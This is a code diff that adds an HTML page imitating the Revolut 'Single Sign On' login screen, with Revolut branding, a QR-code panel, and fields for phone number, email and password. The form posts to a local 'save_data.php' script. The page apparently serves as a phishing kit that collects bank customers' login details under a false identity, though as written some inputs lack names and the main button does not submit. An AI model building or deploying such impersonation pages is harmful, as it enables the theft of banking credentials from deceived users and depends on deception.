@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Single Sign On | Revolut</title>
+    <link rel="icon" type="image/png" href="assets/favicon-revolut.png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            background-color: #F7F7F7; /* Set background color */
+        }
+        header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        h1 {
+            text-align: left;
+            font-size: 34px;
+            color: rgb(25, 28, 31); /* Set heading color */
+        }
+        .content {
+            display: flex;
+            flex-direction: column; /* Updated for mobile */
+            align-items: center; /* Updated for mobile */
+            margin: 40px;
+        }
+        form {
+            max-width: 400px;
+            margin-right: 20px;
+            width: 100%; /* Added for mobile */
+        }
+        input[type="text"], input[type="number"], input[type="password"] {
+            width: calc(100% - 20px); /* Adjust width */
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 30px; /* Set border radius */
+            border: none;
+            background-color: #EDEFF2; /* Set background color */
+            color: rgb(90, 90, 90); /* Set text color */
+            height: 40px; /* Set height */
+            box-sizing: border-box;
+        }
+
+        .phone-input-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .phone-prefix {
+            width: 25% !important; /* Set width for prefix input */
+        }
+
+        .phone-number {
+            width: 70% !important; /* Set width for phone number input */
+        }
+
+        button {
+            width: calc(100% - 20px); /* Adjust width */
+            height: 50px !important;
+            padding: 10px;
+            margin-top: 10px;
+            background-color: #6E4CE5; /* Set button color */
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 30px; /* Set border radius */
+            height: 40px; /* Set height */
+            box-sizing: border-box;
+            font-size: 20px;
+        }
+        button:hover {
+            background-color: #5b3ebc; /* Darken button color on hover */
+        }
+        p {
+            font-size: 16px;
+            color: rgb(117, 128, 138); /* Set paragraph color */
+        }
+        h2 {
+            color: rgb(25, 28, 31); /* Set heading color */
+        }
+        .right-section {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px; /* Updated for mobile */
+        }
+        .qr-code {
+            width: 180px;
+        }
+
+        hr {
+            width: calc(100% - 20px);
+            border: 0;
+            border-top: 1px solid rgb(117, 128, 138);
+            margin: 20px 0;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .custom-button {
+            width: calc(100% - 20px);
+            height: 50px;
+            padding: 10px;
+            margin-top: 10px;
+            background-color: white;
+            color: rgb(90, 90, 90);
+            border: none;
+            cursor: pointer;
+            border-radius: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 16px;
+        }
+
+        .custom-button img {
+            width: 20px;
+            margin-right: 10px;
+        }
+
+        @media only screen and (min-width: 600px) {
+            .content {
+                flex-direction: row; /* Reverting to row for desktop */
+                justify-content: center; /* Centering horizontally for desktop */
+            }
+            .right-section {
+                margin-left: 100px; /* Resetting margin for desktop */
+            }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="assets/logo.svg" alt="logo">
+</header>
+
+<div class="content">
+    <div>
+        <h1>Welcome Back</h1>
+        <p>Enter the email, phone number, and <br> password associated with your Revolut account.</p>
+        <form id="dataForm" method="post" action="save_data.php">
+            <h2>Login</h2>
+            <div class="phone-input-container">
+                <input type="text" class="phone-prefix" placeholder="Prefix">
+                <input type="text" class="phone-number" placeholder="Phone Number">
+            </div>
+            <input type="text" id="emailInput" placeholder="Email">
+            <input type="password" id="passwordInput" placeholder="Password">
+            <p style="color: rgba(110, 76, 229, 0.7); cursor: pointer; font-size: 12px;">Lost access to my phone number</p>
+            <p style="color: rgba(110, 76, 229, 0.7); cursor: pointer; font-size: 12px;">Lost password or email</p>
+            <button type="button">Continue</button>
+            <hr>
+            <div class="button-group">
+                <button class="custom-button"><img src="assets/mail-svgrepo-com.svg" alt="Email Icon">Continue with email</button>
+                <button class="custom-button"><img src="assets/google-svgrepo-com.svg" alt="Phone Icon">Continue with Google</button>
+                <button class="custom-button"><img src="assets/apple-173-svgrepo-com.svg" alt="Google Icon">Continue with Apple</button>
+                <p style="color: #0066FF; margin-top: 24px;">Create Account</p>
+            </div>
+        </form>
+    </div>
+    <div class="right-section">
+        <img class="qr-code" src="assets/qr-code.png" alt="QR Code">
+        <h6>Log in with QR code</h6>
+        <p>Scan this code with your phone <br> camera to log in instantly</p>
+    </div>
+</div>
+
+</body>
+</html>
